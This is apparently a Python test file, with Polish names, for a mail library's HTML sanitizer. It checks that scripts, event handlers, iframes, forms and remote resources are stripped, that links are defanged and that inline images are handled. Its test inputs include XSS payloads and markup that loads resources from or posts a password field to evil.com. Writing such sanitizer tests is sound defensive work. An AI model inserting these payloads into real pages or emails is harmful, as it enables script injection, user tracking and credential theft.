import pytest

from mailcore.analiza import analizuj
from mailcore.html_bezpieczny import bezpieczny_html
from mailcore.model import zalacznik_z_danych
from mailcore.parsuj import parsuj
from mailcore.serializacja import do_json

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 20


@pytest.mark.parametrize("wejscie,zakazane", [
    ("<script>alert(1)</script>", "<script"),
    ('<img src="http://track.evil.com/p.gif">', "track.evil.com"),
    ('<a href="javascript:alert(1)">x</a>', "javascript:"),
    ('<meta http-equiv="refresh" content="0;url=http://evil.com">', "http-equiv"),
    ("<img src=x onerror=alert(1)>", "onerror"),
    ('<link rel="stylesheet" href="http://evil.com/a.css">', "evil.com"),
    ('<table background="http://evil.com/t.png"><tr><td>x</td></tr></table>', "evil.com"),
    ('<img srcset="http://evil.com/a.png 2x">', "evil.com"),
    ('<form action="http://evil.com"><input name="haslo"></form>', "<form"),
    ('<iframe src="http://evil.com"></iframe>', "<iframe"),
    ("<style>body{background:url(http://evil.com/a.png)}</style>", "evil.com"),
])
def test_blokuje(wejscie, zakazane):
    assert zakazane not in bezpieczny_html(wejscie, [])


def test_style_url_usuniete_reszta_zostaje():
    wynik = bezpieczny_html('<div style="background:url(http://evil.com/a.png);color:red">x</div>', [])
    assert "url(" not in wynik
    assert "color:red" in wynik.replace(" ", "")


def test_link_zamieniony_na_span():
    wynik = bezpieczny_html('<a href="https://evil.com/x">pko.pl</a>', [])
    assert "pko.pl" in wynik
    assert 'title="hxxps://evil[.]com/x"' in wynik
    assert "href" not in wynik


def test_cid_jako_data_uri():
    z = zalacznik_z_danych("logo.png", "image/png", PNG, content_id="logo1", inline=True)
    wynik = bezpieczny_html('<img src="cid:logo1">', [z])
    assert 'src="data:image/png;base64,' in wynik


def test_cid_za_duzy_lub_nie_obraz_usuniety():
    duzy = zalacznik_z_danych("a.png", "image/png", PNG, content_id="a")
    exe = zalacznik_z_danych("a.exe", "application/octet-stream", b"MZ", content_id="b")
    wynik = bezpieczny_html('<img src="cid:a"><img src="cid:b">', [duzy, exe], max_obraz=5)
    assert "data:" not in wynik


def test_do_json_ma_html_bezpieczny_a_nie_surowy(zbuduj_mail):
    w = parsuj(zbuduj_mail(html="<p>Hej</p><script>alert(1)</script>"), "a.eml")
    j = do_json(w, analizuj(w))
    assert "<p>Hej</p>" in j["wiadomosc"]["html_bezpieczny"]
    assert "<script" not in str(j)
